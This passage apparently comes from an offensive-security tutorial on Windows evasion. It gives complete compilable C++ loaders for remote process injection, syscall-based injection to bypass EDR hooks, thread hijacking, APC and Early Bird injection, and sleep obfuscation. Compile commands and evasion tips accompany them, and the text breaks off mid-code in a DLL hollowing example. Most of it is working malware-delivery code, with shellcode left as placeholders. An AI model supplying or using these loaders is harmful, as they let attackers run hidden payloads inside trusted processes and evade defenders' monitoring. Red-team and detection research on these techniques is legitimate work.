> Patch ETW **before** performing any suspicious operations. If you patch it after allocating executable memory, the allocation event has already been logged. The order of operations matters.
{: .prompt-tip }

---

## Part 6: Process Injection (Level 5 — Expert)

All techniques so far execute shellcode within your own process. Process injection takes this a step further — injecting and executing shellcode inside another legitimate process (e.g., `explorer.exe`, `svchost.exe`, `notepad.exe`). This is more stealthy because:

- Your loader process can exit after injection — leaving no suspicious process running
- The shellcode runs under the context of a trusted process
- Network connections from `svchost.exe` look more legitimate than from `unknown_loader.exe`

---

### Technique 18: Classic Remote Process Injection

The classic technique uses four Win32 API calls:

1. `OpenProcess` — Get a handle to the target process
2. `VirtualAllocEx` — Allocate memory in the remote process
3. `WriteProcessMemory` — Write shellcode into the remote allocation
4. `CreateRemoteThread` — Create a thread in the remote process that executes the shellcode

**Full Code — `technique18_remote_injection.cpp`:**

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Find a process ID by name
DWORD FindProcessId(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

// Encrypted shellcode (use your AES/XOR encrypted payload)
unsigned char encrypted_shellcode[] = {
    // ... your encrypted shellcode ...
    0x00
};
unsigned char xor_key[] = { 0x41, 0x42, 0x43, 0x44 };
SIZE_T shellcode_size = sizeof(encrypted_shellcode);

void xor_decrypt(unsigned char* d, SIZE_T l, unsigned char* k, SIZE_T kl) {
    for (SIZE_T i = 0; i < l; i++) d[i] ^= k[i % kl];
}

int main() {
    // Step 1: Find the target process
    const char* targetProcess = "notepad.exe";
    DWORD targetPID = FindProcessId(targetProcess);

    if (targetPID == 0) {
        printf("[-] Could not find %s. Please start it first.\n",
               targetProcess);
        return 1;
    }
    printf("[+] Found %s with PID: %d\n", targetProcess, targetPID);

    // Step 2: Decrypt shellcode locally first
    unsigned char* decrypted = (unsigned char*)malloc(shellcode_size);
    memcpy(decrypted, encrypted_shellcode, shellcode_size);
    xor_decrypt(decrypted, shellcode_size, xor_key, sizeof(xor_key));
    printf("[+] Shellcode decrypted locally\n");

    // Step 3: Open the target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,     // Full access (VM operations + thread creation)
        FALSE,                  // Don't inherit handle
        targetPID               // Target PID
    );

    if (!hProcess) {
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        free(decrypted);
        return 1;
    }
    printf("[+] Opened process handle: 0x%p\n", hProcess);

    // Step 4: Allocate memory in the remote process (RW first)
    LPVOID remoteMem = VirtualAllocEx(
        hProcess,               // Remote process handle
        NULL,                   // Let the system choose the address
        shellcode_size,         // Size
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE          // Start with RW
    );

    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        free(decrypted);
        return 1;
    }
    printf("[+] Remote memory allocated at: 0x%p\n", remoteMem);

    // Step 5: Write shellcode to remote process
    SIZE_T bytesWritten;
    BOOL writeResult = WriteProcessMemory(
        hProcess,               // Remote process handle
        remoteMem,              // Remote destination
        decrypted,              // Local source (decrypted shellcode)
        shellcode_size,         // Size
        &bytesWritten           // Bytes actually written
    );

    // Zero out local copy immediately
    SecureZeroMemory(decrypted, shellcode_size);
    free(decrypted);

    if (!writeResult) {
        printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Wrote %zu bytes to remote process\n", bytesWritten);

    // Step 6: Change remote memory protection to RX
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteMem, shellcode_size,
                     PAGE_EXECUTE_READ, &oldProtect);
    printf("[+] Remote memory protection changed to RX\n");

    // Step 7: Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess,                                     // Remote process
        NULL,                                         // Default security
        0,                                            // Default stack size
        (LPTHREAD_START_ROUTINE)remoteMem,            // Start address
        NULL,                                         // No parameter
        0,                                            // Run immediately
        NULL                                          // Don't need thread ID
    );

    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Remote thread created! Shellcode executing in %s\n",
           targetProcess);

    // Wait for the remote thread (optional — you could also exit here)
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique18_inject.exe technique18_remote_injection.cpp -lws2_32 -static
```

> `CreateRemoteThread` is one of the most monitored API calls across all EDR products. This technique works against basic AV but will be caught by any competent EDR. The following techniques provide stealthier alternatives.
{: .prompt-warning }

---

### Technique 19: Process Injection with Syscalls

Replace all Win32 API calls with their `Nt*` equivalents via direct or indirect syscalls to bypass EDR userland hooks:

| Win32 API | Nt Equivalent |
|---|---|
| `OpenProcess` | `NtOpenProcess` |
| `VirtualAllocEx` | `NtAllocateVirtualMemory` |
| `WriteProcessMemory` | `NtWriteVirtualMemory` |
| `VirtualProtectEx` | `NtProtectVirtualMemory` |
| `CreateRemoteThread` | `NtCreateThreadEx` |

**Full Code — `technique19_syscall_injection.cpp`:**

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// NT function typedefs
typedef NTSTATUS (NTAPI *NtOpenProcess_t)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PVOID ClientId
);

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// CLIENT_ID structure for NtOpenProcess
typedef struct _MY_CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} MY_CLIENT_ID;

// OBJECT_ATTRIBUTES
typedef struct _MY_OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} MY_OBJECT_ATTRIBUTES;

DWORD FindProcessId(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

// Resolve ntdll function pointers (combine with Technique 12 for syscalls)
#define RESOLVE_NT(name) (name##_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), #name)

unsigned char encrypted_shellcode[] = { 0x00 }; // Your encrypted shellcode
unsigned char xor_key[] = { 0x41 };
SIZE_T shellcode_size = sizeof(encrypted_shellcode);

void xor_decrypt(unsigned char* d, SIZE_T l, unsigned char* k, SIZE_T kl) {
    for (SIZE_T i = 0; i < l; i++) d[i] ^= k[i % kl];
}

int main() {
    // Resolve Nt functions
    // In production, use direct/indirect syscalls (Technique 12/13)
    // instead of GetProcAddress
    auto NtOpenProcess = RESOLVE_NT(NtOpenProcess);
    auto NtAllocateVirtualMemory = RESOLVE_NT(NtAllocateVirtualMemory);
    auto NtWriteVirtualMemory = RESOLVE_NT(NtWriteVirtualMemory);
    auto NtProtectVirtualMemory = RESOLVE_NT(NtProtectVirtualMemory);
    auto NtCreateThreadEx = RESOLVE_NT(NtCreateThreadEx);

    // Find target process
    DWORD pid = FindProcessId("notepad.exe");
    if (!pid) { printf("[-] Target not found\n"); return 1; }
    printf("[+] Target PID: %d\n", pid);

    // Decrypt shellcode
    unsigned char* sc = (unsigned char*)malloc(shellcode_size);
    memcpy(sc, encrypted_shellcode, shellcode_size);
    xor_decrypt(sc, shellcode_size, xor_key, sizeof(xor_key));

    // NtOpenProcess
    HANDLE hProcess = NULL;
    MY_OBJECT_ATTRIBUTES oa = { sizeof(oa), 0 };
    MY_CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, 0 };

    NTSTATUS status = NtOpenProcess(
        &hProcess,
        PROCESS_ALL_ACCESS,
        &oa,
        &cid
    );
    printf("[*] NtOpenProcess: 0x%lX, handle=0x%p\n", status, hProcess);

    // NtAllocateVirtualMemory (remote)
    PVOID baseAddr = NULL;
    SIZE_T regionSize = shellcode_size;
    status = NtAllocateVirtualMemory(
        hProcess, &baseAddr, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    printf("[*] NtAllocateVirtualMemory: 0x%lX, addr=0x%p\n",
           status, baseAddr);

    // NtWriteVirtualMemory
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(
        hProcess, baseAddr, sc, shellcode_size, &bytesWritten
    );
    printf("[*] NtWriteVirtualMemory: 0x%lX, written=%zu\n",
           status, bytesWritten);

    SecureZeroMemory(sc, shellcode_size);
    free(sc);

    // NtProtectVirtualMemory
    PVOID protBase = baseAddr;
    SIZE_T protSize = shellcode_size;
    ULONG oldProt = 0;
    status = NtProtectVirtualMemory(
        hProcess, &protBase, &protSize,
        PAGE_EXECUTE_READ, &oldProt
    );
    printf("[*] NtProtectVirtualMemory: 0x%lX\n", status);

    // NtCreateThreadEx (remote)
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL,
        hProcess, baseAddr, NULL,
        0, 0, 0, 0, NULL
    );
    printf("[*] NtCreateThreadEx: 0x%lX\n", status);

    if (hThread) {
        printf("[+] Shellcode injected and executing via Nt syscalls!\n");
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    CloseHandle(hProcess);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique19_ntinject.exe technique19_syscall_injection.cpp -lws2_32 -static
```

---

### Technique 20: Thread Hijacking

Thread hijacking avoids creating any new thread (local or remote). Instead, it suspends an existing thread in the target process, modifies its instruction pointer to point to the shellcode, and resumes it.

**Step-by-step:**

1. Find the target process and a thread within it
2. `OpenProcess` + `OpenThread`
3. Allocate memory and write shellcode in the remote process
4. `SuspendThread` the target thread
5. `GetThreadContext` to save the current register state
6. Modify `RIP` (instruction pointer on x64) to point to shellcode
7. `SetThreadContext` with the modified context
8. `ResumeThread` — the thread now executes shellcode

**Full Code — `technique20_thread_hijack.cpp`:**

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindProcessId(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

DWORD FindThreadId(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    DWORD tid = 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                break;  // Get the first thread
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tid;
}

// Shellcode with a stub that preserves the original execution flow
// In practice, the shellcode should save registers, execute payload,
// restore registers, and jump back to the original RIP

unsigned char encrypted_shellcode[] = { 0x00 };  // Your shellcode
unsigned char xor_key[] = { 0x41 };
SIZE_T shellcode_size = sizeof(encrypted_shellcode);

void xor_decrypt(unsigned char* d, SIZE_T l, unsigned char* k, SIZE_T kl) {
    for (SIZE_T i = 0; i < l; i++) d[i] ^= k[i % kl];
}

int main() {
    const char* target = "notepad.exe";

    // Step 1: Find process and thread
    DWORD pid = FindProcessId(target);
    if (!pid) { printf("[-] Process not found\n"); return 1; }

    DWORD tid = FindThreadId(pid);
    if (!tid) { printf("[-] Thread not found\n"); return 1; }

    printf("[+] Target: %s (PID: %d, TID: %d)\n", target, pid, tid);

    // Step 2: Decrypt shellcode
    unsigned char* sc = (unsigned char*)malloc(shellcode_size);
    memcpy(sc, encrypted_shellcode, shellcode_size);
    xor_decrypt(sc, shellcode_size, xor_key, sizeof(xor_key));

    // Step 3: Open process and thread
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);

    if (!hProcess || !hThread) {
        printf("[-] Failed to open process/thread\n");
        free(sc);
        return 1;
    }

    // Step 4: Allocate and write shellcode in remote process
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcode_size,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_READWRITE);
    WriteProcessMemory(hProcess, remoteMem, sc, shellcode_size, NULL);
    SecureZeroMemory(sc, shellcode_size);
    free(sc);

    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteMem, shellcode_size,
                     PAGE_EXECUTE_READ, &oldProtect);

    printf("[+] Shellcode written to remote process at: 0x%p\n", remoteMem);

    // Step 5: Suspend the target thread
    SuspendThread(hThread);
    printf("[+] Thread suspended\n");

    // Step 6: Get thread context (save original state)
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    printf("[+] Original RIP: 0x%llX\n", ctx.Rip);

    // Step 7: Modify RIP to point to our shellcode
    ctx.Rip = (DWORD64)remoteMem;

    // Step 8: Set the modified context
    SetThreadContext(hThread, &ctx);
    printf("[+] RIP modified to: 0x%llX (shellcode)\n", ctx.Rip);

    // Step 9: Resume the thread — it now executes our shellcode
    ResumeThread(hThread);
    printf("[+] Thread resumed — shellcode executing!\n");

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique20_hijack.exe technique20_thread_hijack.cpp -lws2_32 -static
```

> Thread hijacking is stealthier than `CreateRemoteThread` because no new thread is created. However, if the shellcode crashes, the entire target process crashes. Your shellcode should properly save and restore registers, or use a trampoline that returns to the original `RIP` after execution.
{: .prompt-warning }

---

### Technique 21: APC Injection (QueueUserAPC)

An **Asynchronous Procedure Call (APC)** is a mechanism Windows provides for executing code in the context of a specific thread. When a thread enters an "alertable" wait state (e.g., `SleepEx`, `WaitForSingleObjectEx`, `WaitForMultipleObjectsEx`), any queued APCs are executed.

**Step-by-step:**

1. Find the target process and an alertable thread
2. Allocate and write shellcode in the remote process
3. Queue an APC to the target thread with the shellcode address as the callback
4. When the thread enters an alertable wait, the shellcode executes

**Full Code — `technique21_apc_injection.cpp`:**

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindProcessId(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

// Queue APC to ALL threads in the target process (increases chance of execution)
BOOL QueueAPCToAllThreads(DWORD pid, LPVOID shellcodeAddr) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    BOOL queued = FALSE;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(
                    THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                    FALSE, te.th32ThreadID);

                if (hThread) {
                    // Queue the APC — shellcodeAddr is the APC callback
                    if (QueueUserAPC((PAPCFUNC)shellcodeAddr,
                                     hThread, 0)) {
                        printf("[+] APC queued to thread %d\n",
                               te.th32ThreadID);
                        queued = TRUE;
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    return queued;
}

unsigned char encrypted_shellcode[] = { 0x00 };
unsigned char xor_key[] = { 0x41 };
SIZE_T shellcode_size = sizeof(encrypted_shellcode);

void xor_decrypt(unsigned char* d, SIZE_T l, unsigned char* k, SIZE_T kl) {
    for (SIZE_T i = 0; i < l; i++) d[i] ^= k[i % kl];
}

int main() {
    const char* target = "explorer.exe";
    DWORD pid = FindProcessId(target);
    if (!pid) { printf("[-] Target not found\n"); return 1; }
    printf("[+] Target: %s (PID: %d)\n", target, pid);

    // Decrypt shellcode
    unsigned char* sc = (unsigned char*)malloc(shellcode_size);
    memcpy(sc, encrypted_shellcode, shellcode_size);
    xor_decrypt(sc, shellcode_size, xor_key, sizeof(xor_key));

    // Open process and inject shellcode
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) { printf("[-] OpenProcess failed\n"); free(sc); return 1; }

    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcode_size,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_READWRITE);
    WriteProcessMemory(hProcess, remoteMem, sc, shellcode_size, NULL);
    SecureZeroMemory(sc, shellcode_size);
    free(sc);

    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteMem, shellcode_size,
                     PAGE_EXECUTE_READ, &oldProtect);

    printf("[+] Shellcode injected at: 0x%p\n", remoteMem);

    // Queue APC to all threads
    QueueAPCToAllThreads(pid, remoteMem);

    printf("[+] APCs queued. Shellcode will execute when a thread\n");
    printf("    enters an alertable wait state.\n");

    CloseHandle(hProcess);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique21_apc.exe technique21_apc_injection.cpp -lws2_32 -static
```

---

### Technique 22: Early Bird Injection

Early Bird injection combines process creation with APC injection. The key insight: if you create a process in a **suspended state** and queue an APC before the process initializes, the APC will execute before any EDR hooks or monitoring are installed.

**Step-by-step:**

1. `CreateProcessA` with `CREATE_SUSPENDED` flag — the process is created but doesn't run
2. Allocate and write shellcode in the new process
3. Queue an APC to the process's main thread
4. `ResumeThread` — the APC executes first, before the process's main code (and before EDR initialization)

**Full Code — `technique22_early_bird.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

unsigned char encrypted_shellcode[] = { 0x00 };
unsigned char xor_key[] = { 0x41 };
SIZE_T shellcode_size = sizeof(encrypted_shellcode);

void xor_decrypt(unsigned char* d, SIZE_T l, unsigned char* k, SIZE_T kl) {
    for (SIZE_T i = 0; i < l; i++) d[i] ^= k[i % kl];
}

int main() {
    // Step 1: Create a legitimate process in suspended state
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    // svchost.exe is a common target, but notepad is safer for testing
    char targetApp[] = "C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessA(
            targetApp,          // Application path
            NULL,               // Command line
            NULL,               // Process security attributes
            NULL,               // Thread security attributes
            FALSE,              // Don't inherit handles
            CREATE_SUSPENDED,   // Start suspended!
            NULL,               // Use parent's environment
            NULL,               // Use parent's working directory
            &si,                // Startup info
            &pi                 // Process info (PID, handle, etc.)
    )) {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
        return 1;
    }

    printf("[+] Created suspended process: PID=%d, TID=%d\n",
           pi.dwProcessId, pi.dwThreadId);

    // Step 2: Decrypt shellcode
    unsigned char* sc = (unsigned char*)malloc(shellcode_size);
    memcpy(sc, encrypted_shellcode, shellcode_size);
    xor_decrypt(sc, shellcode_size, xor_key, sizeof(xor_key));

    // Step 3: Allocate memory in the new process
    LPVOID remoteMem = VirtualAllocEx(
        pi.hProcess, NULL, shellcode_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        free(sc);
        return 1;
    }
    printf("[+] Allocated memory in child process at: 0x%p\n", remoteMem);

    // Step 4: Write shellcode
    WriteProcessMemory(pi.hProcess, remoteMem, sc, shellcode_size, NULL);
    SecureZeroMemory(sc, shellcode_size);
    free(sc);

    // Step 5: Change protection to RX
    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteMem, shellcode_size,
                     PAGE_EXECUTE_READ, &oldProtect);

    // Step 6: Queue APC to the suspended thread
    // Since the thread hasn't started yet, the APC will be the first
    // thing that executes — before the process's entry point
    QueueUserAPC(
        (PAPCFUNC)remoteMem,    // APC function = shellcode address
        pi.hThread,             // The suspended main thread
        0                       // APC parameter
    );

    printf("[+] APC queued to suspended thread\n");

    // Step 7: Resume the thread — APC fires FIRST, then process continues
    ResumeThread(pi.hThread);
    printf("[+] Thread resumed — Early Bird APC executing!\n");

    // The shellcode runs before the process's main() or WinMain()
    // and before most EDR hooks are in place

    // Cleanup handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique22_earlybird.exe technique22_early_bird.cpp -lws2_32 -static
```

> Early Bird injection is highly effective because the APC executes before most EDR user-mode hooks are installed. However, kernel-level callbacks (`PsSetCreateProcessNotifyRoutine`) will still detect the process creation. This technique is best combined with legitimate-looking parent processes and execution paths.
{: .prompt-tip }

---

## Part 7: Advanced Evasion (Level 6 — Elite/2026)

These techniques represent the cutting edge of offensive security. They combine multiple evasion methods and target the latest detection capabilities.

---

### Technique 23: Sleep Obfuscation (Ekko/Foliage)

**The Problem:**

After your shellcode is decrypted and loaded into memory, it exists in plaintext. Memory scanners (used by EDRs and Defender) periodically scan process memory for known shellcode signatures. Even if your shellcode was encrypted on disk, once it's decrypted and mapped as executable memory, a memory scan can detect it.

This is especially problematic during **sleep periods** — if your implant sleeps for 60 seconds between beacons, that's 60 seconds where a memory scanner can find your plaintext shellcode.

**The Solution: Sleep Obfuscation**

Encrypt the shellcode in memory before sleeping and decrypt it after waking up:

```
Execute shellcode → Sleep timer triggers →
  1. Change memory to RW
  2. Encrypt shellcode in place
  3. Sleep (shellcode is encrypted in memory — scanners see random bytes)
  4. Wake up
  5. Decrypt shellcode in place
  6. Change memory to RX
→ Continue execution
```

**Ekko Technique Overview:**

Ekko uses a clever chain of `CreateTimerQueueTimer` calls + ROP gadgets to perform the encrypt-sleep-decrypt cycle entirely through legitimate Windows APIs:

1. Set up a timer queue
2. Timer 1: Calls `VirtualProtect` to change shellcode region to `RW`
3. Timer 2: Calls `SystemFunction032` (undocumented — RC4 encryption) to encrypt the region
4. Timer 3: Calls `WaitForSingleObject` (the actual sleep)
5. Timer 4: Calls `SystemFunction032` again to decrypt
6. Timer 5: Calls `VirtualProtect` to change back to `RX`
7. Timer 6: Calls `SetEvent` to signal completion via `NtContinue`

All encryption and protection changes happen through timer callbacks — no suspicious call patterns from your code.

**Conceptual Implementation — `technique23_sleep_obfuscation.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

// SystemFunction032 — undocumented ntdll function for RC4 encryption
// Used by Ekko for in-memory encryption during sleep
typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS (WINAPI *SystemFunction032_t)(USTRING* data, USTRING* key);

// Simplified sleep obfuscation concept
// Full Ekko implementation requires ROP chains and NtContinue

BOOL SleepObfuscate(PVOID shellcodeBase, SIZE_T shellcodeSize,
                     DWORD sleepTimeMs) {
    // Step 1: Resolve SystemFunction032 for RC4 encryption
    HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
    SystemFunction032_t SystemFunction032 = (SystemFunction032_t)
        GetProcAddress(hAdvapi, "SystemFunction032");

    if (!SystemFunction032) {
        printf("[-] Could not resolve SystemFunction032\n");
        return FALSE;
    }

    // Step 2: RC4 key for memory encryption
    char rc4Key[] = "SleepObfuscationKey2026";
    USTRING keyStruct = {
        (DWORD)strlen(rc4Key),
        (DWORD)strlen(rc4Key),
        rc4Key
    };

    USTRING dataStruct = {
        (DWORD)shellcodeSize,
        (DWORD)shellcodeSize,
        shellcodeBase
    };

    // Step 3: Change shellcode memory to RW (needed to encrypt it)
    DWORD oldProtect;
    VirtualProtect(shellcodeBase, shellcodeSize,
                   PAGE_READWRITE, &oldProtect);

    // Step 4: Encrypt shellcode in place using RC4
    SystemFunction032(&dataStruct, &keyStruct);
    printf("[+] Shellcode encrypted in memory (sleeping...)\n");

    // Step 5: Sleep — memory scanners see only encrypted bytes
    Sleep(sleepTimeMs);

    // Step 6: Decrypt shellcode (RC4 is symmetric — same operation)
    // Reset the data struct (SystemFunction032 may modify it)
    dataStruct.Length = (DWORD)shellcodeSize;
    dataStruct.MaximumLength = (DWORD)shellcodeSize;
    dataStruct.Buffer = shellcodeBase;

    keyStruct.Length = (DWORD)strlen(rc4Key);
    keyStruct.MaximumLength = (DWORD)strlen(rc4Key);
    keyStruct.Buffer = rc4Key;

    SystemFunction032(&dataStruct, &keyStruct);
    printf("[+] Shellcode decrypted in memory (resuming...)\n");

    // Step 7: Restore RX protection
    VirtualProtect(shellcodeBase, shellcodeSize,
                   PAGE_EXECUTE_READ, &oldProtect);

    return TRUE;
}

int main() {
    // Example usage in a beacon loop:
    // 1. Load and decrypt shellcode (using previous techniques)
    // 2. Execute shellcode
    // 3. When sleeping between beacons, encrypt memory

    // Simulate: allocate and write some "shellcode"
    SIZE_T scSize = 4096;
    LPVOID mem = VirtualAlloc(NULL, scSize,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Fill with dummy shellcode for demonstration
    memset(mem, 0x90, scSize);  // NOP sled as placeholder

    DWORD oldProt;
    VirtualProtect(mem, scSize, PAGE_EXECUTE_READ, &oldProt);

    // Beacon loop simulation
    for (int i = 0; i < 3; i++) {
        printf("\n[*] Beacon iteration %d\n", i + 1);
        printf("[*] Shellcode executing...\n");

        // ... shellcode does its work ...

        // Sleep with obfuscation (5 seconds)
        SleepObfuscate(mem, scSize, 5000);
    }

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique23_sleep.exe technique23_sleep_obfuscation.cpp -ladvapi32 -lws2_32 -static
```

> The simplified version above demonstrates the concept. The full Ekko/Foliage implementations use timer queue callbacks and ROP chains to perform the encrypt/decrypt cycle without any direct calls from your code — making the operation invisible to behavioral analysis. See the references section for links to the original implementations.
{: .prompt-info }

---

### Technique 24: Module Stomping / DLL Hollowing

This is an enhanced version of Technique 9, specifically designed for remote process injection.

**Concept:**

1. In the target process, load a legitimate but expendable DLL (e.g., `amsi.dll`, `xpsservices.dll`)
2. Overwrite the DLL's `.text` section with shellcode
3. Execute from within the DLL's address range

Memory scanners see code executing from a legitimate DLL — not from a suspicious dynamically allocated region.

**Conceptual Code — `technique24_dll_hollowing.cpp`:**

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindProcessId(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

int main() {
    DWORD pid = FindProcessId("notepad.exe");
    if (!pid) { printf("[-] Target not found\n"); return 1; }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) { printf("[-] OpenProcess failed\n"); return 1; }

    // Step 1: Force the target process to load a sacrificial DLL
    // We use CreateRemoteThread + LoadLibraryA to load the DLL
    // (In production, use NtCreateThreadEx or APC-based loading)

    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibrary = GetProcAddress(hK32, "LoadLibraryA");

    // Write the DLL path into the remote process
    char dllPath[] = "C:\\Windows\\System32\\amsi.dll";
    LPVOID remoteDllPath = VirtualAllocEx(hProcess, NULL, sizeof(dllPath),
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_READWRITE);
    WriteProcessMemory(hProcess, remoteDllPath, dllPath,
                       sizeof(dllPath), NULL);

    // Load the DLL in the remote process
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        remoteDllPath, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    // Get the return value (HMODULE of loaded DLL)
